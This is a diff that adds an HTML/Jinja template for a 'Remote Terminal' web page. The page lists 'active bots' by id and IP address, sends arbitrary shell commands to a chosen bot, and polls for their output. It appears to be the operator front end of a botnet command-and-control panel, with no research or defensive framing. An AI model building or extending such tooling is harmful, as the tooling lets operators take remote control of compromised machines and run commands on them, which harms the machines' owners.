@@ -1,0 +1,70 @@
+{% extends "base.html" %}
+{% block title %}Terminal{% endblock %}
+{% block content %}
+<div class="page-title">Remote Terminal</div>
+<div style="display:flex; gap:20px; flex-wrap:wrap; margin-bottom:20px;">
+    <div style="flex:1; min-width:200px;">
+        <label style="display:block; font-size:13px; color:#4a5568; margin-bottom:4px;">Target Node</label>
+        <select id="botSelect" style="width:100%; padding:10px 14px; border:1px solid #e2e8f0; border-radius:8px; background:#fff; font-size:14px;">
+            <option value="">-- Select --</option>
+        </select>
+    </div>
+</div>
+<div style="background:#1a1a2e; border-radius:10px; padding:20px; min-height:300px;">
+    <div id="termOutput" style="color:#e2e8f0; font-family:'Courier New',monospace; font-size:14px; white-space:pre-wrap; word-break:break-all; min-height:200px;">> Select a node and type a command...</div>
+    <div style="display:flex; gap:10px; margin-top:15px;">
+        <input type="text" id="cmdInput" placeholder="Enter command..." style="flex:1; padding:12px; border:1px solid #4a5568; border-radius:6px; background:#0f0f1a; color:#e2e8f0; font-family:monospace; outline:none;">
+        <button onclick="sendCommand()" style="padding:12px 25px; background:#4a6cf7; border:none; border-radius:6px; color:#fff; font-weight:600; cursor:pointer;">Run</button>
+    </div>
+</div>
+<script>
+    let selectedBot = null;
+    async function loadBots() {
+        try {
+            const r = await fetch('/api/active_bots');
+            const bots = await r.json();
+            const sel = document.getElementById('botSelect');
+            sel.innerHTML = '<option value="">-- Select --</option>' + bots.map(b => `<option value="${b.id}">${b.id} (${b.ip})</option>`).join('');
+        } catch(e) {}
+    }
+    document.getElementById('botSelect').addEventListener('change', function() {
+        selectedBot = this.value;
+        document.getElementById('termOutput').innerText = `> Connected to node ${selectedBot || 'none'}`;
+    });
+    async function sendCommand() {
+        const cmd = document.getElementById('cmdInput').value.trim();
+        if (!cmd || !selectedBot) { alert('Select a node and enter a command.'); return; }
+        const out = document.getElementById('termOutput');
+        out.innerText += `\n${selectedBot}> ${cmd}`;
+        try {
+            const r = await fetch('/api/send_command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ id: selectedBot, cmd })
+            });
+            if (!r.ok) { out.innerText += '\n[ERROR] Failed.'; return; }
+            let attempts = 0;
+            const interval = setInterval(async () => {
+                attempts++;
+                try {
+                    const res = await fetch(`/api/get_result?id=${selectedBot}`);
+                    if (res.ok) {
+                        const data = await res.json();
+                        if (data.output) {
+                            out.innerText += `\n${data.output}`;
+                            clearInterval(interval);
+                            out.scrollTop = out.scrollHeight;
+                        }
+                    }
+                } catch(e) {}
+                if (attempts >= 15) { out.innerText += '\n[TIMEOUT]'; clearInterval(interval); }
+            }, 1000);
+        } catch(e) { out.innerText += '\n[ERROR] Network.'; }
+        document.getElementById('cmdInput').value = '';
+        out.scrollTop = out.scrollHeight;
+    }
+    document.getElementById('cmdInput').addEventListener('keypress', function(e) { if (e.key === 'Enter') sendCommand(); });
+    loadBots();
+    setInterval(loadBots, 5000);
+</script>
+{% endblock %}
